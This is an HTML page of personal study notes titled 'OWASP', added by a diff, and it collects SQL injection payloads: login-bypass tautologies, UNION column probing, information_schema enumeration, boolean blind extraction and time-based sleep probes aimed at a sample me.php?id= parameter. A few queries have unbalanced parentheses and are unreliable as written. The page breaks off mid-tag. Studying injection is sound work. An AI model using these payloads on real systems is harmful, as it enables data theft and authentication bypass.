@@ -1,0 +1,785 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>OWASP</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="792a52dd-3e64-452f-a289-60290b5e7e1f" class="page sans"><header><h1 class="page-title">OWASP</h1><p class="page-description"></p></header><div class="page-body"><p id="41eee34a-cc9a-4f87-af34-d7c184682518" class="">
+</p><h1 id="26d22894-7130-4f3e-aab0-4747299d3d1f" class="">SQL Injection:</h1><h2 id="b43d3fc3-d220-4393-9f2e-f302847302b9" class=""><mark class="highlight-red">Simple:</mark></h2><ul id="46f29d63-ec70-4abf-908d-e63a956cd7c1" class="bulleted-list"><li style="list-style-type:disc"><code>“ or 1=1</code></li></ul><ul id="148bc9de-a44e-4ce4-8f60-17527034d081" class="bulleted-list"><li style="list-style-type:disc"><code>‘ or 1=1 # </code></li></ul><ul id="e6f9bf40-9518-49dc-995d-709cec7baa19" class="bulleted-list"><li style="list-style-type:disc"><code>‘ or 1=1 — </code></li></ul><p id="a44d9a91-b244-4e0e-8f98-8deab300a469" class=""><strong>Note:</strong> Databases have differ syntaxs like scape in <mark class="highlight-red">mysql: #</mark> | <mark class="highlight-red">sqli: —</mark><mark class="highlight-brown"> </mark><mark class="highlight-default">or the quotation can be </mark><mark class="highlight-red">‘</mark><mark class="highlight-default"> or </mark><mark class="highlight-red">“</mark><mark class="highlight-default"> or nothing .</mark></p><p id="09bae913-b2a1-4b98-9825-7ed5e3fba881" class=""><strong>Note:</strong> Sometimes browser can’t parse the ‘#’ or ‘—’ so we need to use their quote form ex(<mark class="highlight-red">%20</mark>).</p><h2 id="1ee14969-d3f8-44bf-a354-9182f88105ca" class=""><mark class="highlight-red">Direct:</mark></h2><h3 id="f56bf1ea-5a60-46cc-ae01-6e1ac3817da3" class="">Order:</h3><ul id="cf41e0ca-8f28-4816-a299-eca49d0d3070" class="bulleted-list"><li style="list-style-type:disc"><code>Order by name;</code></li></ul><ul id="2a56d19d-72c0-4495-b16f-014adc2cb640" class="bulleted-list"><li style="list-style-type:disc"><code>order by 1;</code></li></ul><h3 id="b3d153e9-6226-40bc-8e9a-9f3b41ce9549" class="">Union:</h3><p id="20fdf56d-2b0b-4bf7-89a5-ba2e6f9b294f" class=""><strong>Steps:</strong> Check for hole using order <mark class="highlight-red">&gt;&gt;</mark> find the max number of columns <mark class="highlight-red">&gt;&gt; </mark><mark class="highlight-default">inject using union</mark></p><ul id="4512fb31-d9c7-41a8-8896-78b576638e12" class="bulleted-list"><li style="list-style-type:disc"><code>‘ order by 1/2/3/4</code> | <code>1 order by 1/2/3/4</code> | <code>order by 1/2/3/4</code> | <code>“ order by 1/2/3/4</code> | <code>“/’ order by 1/2/3/4</code></li></ul><p id="9e9b155e-1ac2-4e7a-b4fb-d9adf2ea4a5e" class="">
+</p><p id="46692991-d123-4548-9f03-e6fe2eadc2bd" class=""><mark class="highlight-yellow"><strong>Easy (Manual):</strong></mark></p><ul id="ac3df228-141e-4336-813c-931012a49fe5" class="bulleted-list"><li style="list-style-type:disc"><code>‘ union select column_name from table_name;</code> | <code>union select * from 1, 2, 3</code></li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fa5c1b8e-8a54-4c69-bae8-1ac1a7d61d5e" class="code"><code class="language-SQL">// Get number of columns
+me.php/?id=1 ORDER BY 1 // 2, 3, 4 .. until it gets error
+
+// Get the union result (direct)
+me.php/?id=1 UNION SELECT 1 // if order said its one</code></pre><p id="fe2457a1-224b-437b-b4d6-75710e41cfd6" class=""><strong>Note: </strong>Mostly using for passwordless login.</p><p id="4a249b2e-4c2a-4c9c-9983-f19ca11abb05" class="">
+</p><p id="9c40f304-c10b-4d56-9af9-30158391b522" class=""><mark class="highlight-yellow"><strong>Deep(Schema):</strong></mark></p><ul id="d24ed301-d1a4-409b-8cc6-c190c5f3d37b" class="bulleted-list"><li style="list-style-type:disc"><code>select  * from information_schema.schemata</code> | <code>select  schema_name from information_schema.schemata</code>  —&gt; Get name of databases</li></ul><ul id="dcff6bc2-4c07-482d-98ae-0a9b4f3dbd8c" class="bulleted-list"><li style="list-style-type:disc"><code>select  * from information_schema.tables</code> | <code>select  table_name from information_schema.tables</code></li></ul><ul id="2431fca1-6d5f-43cc-bd21-3649511d323c" class="bulleted-list"><li style="list-style-type:disc"><code>select  * from information_schema.columns</code> | <code>select column_name from information_schema.columns</code></li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="05368ff5-77ad-4d0f-a213-c5d2e5a28599" class="code"><code class="language-SQL">// Get name of databases
+SELECT group_concat(schema_name) FROM information_schema.schemata;
+
+// Get tables based on database name
+SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = &#x27;test&#x27;;
+
+// Get columns based on database name and table name
+SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = &#x27;test&#x27; and table_name = &#x27;people&#x27;;</code></pre><p id="65954b29-c1cf-4165-9e44-864e4c394122" class=""><strong>Note:</strong> These types of results are multi-line which the website may not accept so we need to group them using <code>group_concat(*_name)</code> .</p><h2 id="b1d8f4bb-754c-4af3-840d-25eb4692d662" class=""><mark class="highlight-red">Indirect:</mark></h2><h3 id="4cc93ba5-305e-4363-9fb9-abe371a137fd" class="">Blind Injection:</h3><p id="8c2de027-acd1-48ec-a67c-cb3524a065ef" class=""><mark class="highlight-yellow"><strong>Detection:</strong></mark></p><ul id="3298309a-69ef-4ece-a457-b9deaf7b280c" class="bulleted-list"><li style="list-style-type:disc"><strong>Original:</strong><ul id="572b4db5-c0a8-449b-aa50-487ba1210f0c" class="bulleted-list"><li style="list-style-type:circle"><code>me.php/?id=1</code></li></ul></li></ul><ul id="63df3ec2-5d00-45ca-81c1-8f2c9be275fe" class="bulleted-list"><li style="list-style-type:disc"><strong>Test 1: </strong><ul id="311b2089-8c4c-493f-9590-82edfcb6eb57" class="bulleted-list"><li style="list-style-type:circle"><code>me.php/?id=1 and 1=1</code></li></ul><ul id="f2677eea-d53c-423e-9f4f-8c9cc8e46c1b" class="bulleted-list"><li style="list-style-type:circle"><code>me.php/?id=1&#x27; and &#x27;1&#x27;=&#x27;1</code></li></ul><ul id="fd4f89d6-4ccf-4369-a547-42d3bce4a656" class="bulleted-list"><li style="list-style-type:circle"><code>me.php/?id=1&quot; and &quot;1&quot;=&quot;1</code></li></ul></li></ul><ul id="a7e4f66a-ec04-4780-9b83-bf94f94745d1" class="bulleted-list"><li style="list-style-type:disc"><strong>Test 2:</strong><ul id="ee2b13cb-c264-4afd-bc1c-82329455654a" class="bulleted-list"><li style="list-style-type:circle"><code>me.php/?id=1 and 1=2</code></li></ul><ul id="cb8655a8-071f-4b85-92b2-5cf9806b67bc" class="bulleted-list"><li style="list-style-type:circle"><code>me.php/?id=1&#x27; and &#x27;1&#x27;=&#x27;2</code></li></ul><ul id="df2704d5-185c-46ad-b5df-841b1a42e27e" class="bulleted-list"><li style="list-style-type:circle"><code>me.php/?id=1&quot; and &quot;1&quot;=&quot;2</code></li></ul></li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="adcb517b-fd1d-4cf4-a255-50c96b3106b8" class="code"><code class="language-SQL">// Find the true and false condition
+True: me.php/?id=1 AND 1=1
+False: me.php/?id=1 AND 1=2
+
+// Create a condition to work with
+True: me.php/?id=1 AND 1=IF(2&gt;1, 1, 0)
+False: me.php/?id=1 AND 1=IF(1&gt;1, 1, 0)
+
+// Get database length using length() sql
+me.php/?id=1 AND 1=IF(SELECT LENGTH(DATABASE()))&gt;1, 1, 0) // Try 2, 3, 4 ... until it returns error
+
+// Now that we know database name has 6 length, lets get them letter by letter using substr() sql
+me.php/?id=1 AND 1=IF(SELECT SUBSTR(DATABASE(), 1, 1)) = &#x27;a&#x27;, 1, 0) // Try 2, 3, 4 ... AND b, c, d ... d
+
+// Now that we have the database name we try to get tables =&gt; columns =&gt; datas
+// proccess takes a alot of time but worth it :)</code></pre><p id="a1fd1ffc-2322-403f-b57f-95cd31a8013e" class=""><strong>Note:</strong> If Original <mark class="highlight-red">== </mark>Test 1 <mark class="highlight-red">&amp;&amp; </mark><mark class="highlight-default">Test 1 </mark><mark class="highlight-red">≠ </mark><mark class="highlight-default">Test 2 </mark><mark class="highlight-red">⇒ We can say it leaks.</mark></p><p id="f159aaad-b6bf-4c0d-9dcf-4f8565a90818" class="">
+</p><h2 id="58c4aada-b04e-40a1-8977-f246aa491772" class=""><mark class="highlight-red">No Result:</mark></h2><h3 id="cb661738-3e9e-4372-8626-b2b7e9cf2280" class="">Timebase Blind Injection:</h3><p id="969b7b16-f9e2-4350-8b5b-898575350bb7" class="">Everything is same as blind but instead of a number for condition output, we use <mark class="highlight-red">sleep(6)</mark><mark class="highlight-default"> .</mark></p><p id="d3714826-8f71-4298-aed6-df29d04844a7" class="">
+</p><p id="52591dd3-90f0-4adb-88ca-7a8f016a9105" class=""><mark class="highlight-yellow"><strong>Detection:</strong></mark></p><ul id="d2466e31-1e7c-4005-a646-22977aab4069" class="bulleted-list"><li style="list-style-type:disc"><strong>Original:</strong><ul id="9919b9df-be13-4fff-90a5-0c1dc94a4a64" class="bulleted-list"><li style="list-style-type:circle"><code>me.php/?id=1</code></li></ul></li></ul><ul id="d0d1d3ce-7530-42da-a73f-209aacf96496" class="bulleted-list"><li style="list-style-type:disc"><strong>Test: </strong><ul id="61ef5935-ebcb-4135-b83e-2d2639bb27a5" class="bulleted-list"><li style="list-style-type:circle"><code>me.php/?id=1 and sleep(6)</code></li></ul><ul id="986e9210-4cb8-4976-b739-439bf19ed49f" class="bulleted-list"><li style="list-style-type:circle"><code>me.php/?id=1&#x27; and &#x27;sleep(6)</code></li></ul><ul id="da2b8897-6ac7-42f5-82b7-11fc7cc9f3dd" class="bulleted-list"><li style="list-style-type:circle"><code>me.php/?id=1&quot; and &quot;sleep(6)</code></li></ul></li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9a93b424-229b-4ff1-8b7e-278e5ec618e4" 